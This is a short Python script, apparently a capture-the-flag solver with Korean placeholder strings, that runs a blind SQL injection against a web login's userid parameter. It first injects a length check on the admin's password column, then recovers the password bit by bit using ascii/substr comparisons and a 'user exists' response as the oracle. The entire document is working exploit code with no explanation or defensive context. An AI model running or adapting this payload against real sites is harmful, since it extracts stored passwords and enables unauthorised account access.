import requests

def func():
    URL = 'URL 입력'
    
    flag_len = 0
    while(True):
        flag_len += 1
        params = {
            'userid' : f"admin' and length(userpw)={flag_len}#"
        }
        response = requests.get(URL, params=params)
        if "사용자 존재" in response.text:
            break
    
    print(f"[+] flag_len : {flag_len}")

    ans = ''
    n = [1, 2, 4, 8, 16, 32, 64]
    for i in range(flag_len):
        res = 0
        for j in n:
            params = {
                'userid' : f"admin' and ascii(substr(userpw,{i+1},1))&{j}={j}#"
            }
            response = requests.get(URL, params=params)
            if '사용자 존재' in response.text:
                res += j
        ans += chr(res)
        print(f"[+] flag: {ans}")
    
    return ans

if __name__ == "__main__":
    print(func())
